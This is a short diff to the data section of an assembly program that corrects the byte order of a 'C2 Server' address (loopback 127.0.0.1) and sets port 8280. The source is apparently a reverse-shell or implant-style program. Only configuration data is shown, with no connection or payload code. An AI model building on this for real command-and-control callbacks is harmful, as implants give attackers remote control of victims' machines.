@@ -1,6 +1,6 @@
 section .data
     ; Socket data
-    server_ip dd 0x7F000001                     ; IP of C2 Server
+    server_ip dd 0x0100007F                     ; IP of C2 Server
     server_port dw 0x5820                       ; htons(8280)
     socket_fd dq 0x0
     ; Error treating
